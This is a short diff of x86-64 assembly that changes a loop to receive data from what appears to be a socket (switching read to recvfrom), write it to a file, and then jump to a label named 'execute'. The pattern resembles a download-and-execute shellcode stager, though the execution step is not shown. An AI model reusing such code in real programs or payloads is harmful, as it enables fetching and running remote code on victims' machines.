@@ -24,13 +24,14 @@ lea rdi, [rip + f]
 mov rsi, 1
 syscall
 mov r13, rax
-jmp read
+jmp receive 
 
-read:
-mov rax, 0
+receive:
+mov rax, 45
 mov rdi, r12
 mov rsi, rsp
 mov rdx, 1024
+mov r10, 0x100
 syscall
 cmp rax, 0
 jle execute
@@ -39,7 +40,7 @@ mov rax, 1
 mov rdi, r13
 mov rsi, rsp
 syscall
-jmp read
+jmp receive 
 
 execute:
 mov rax, 3
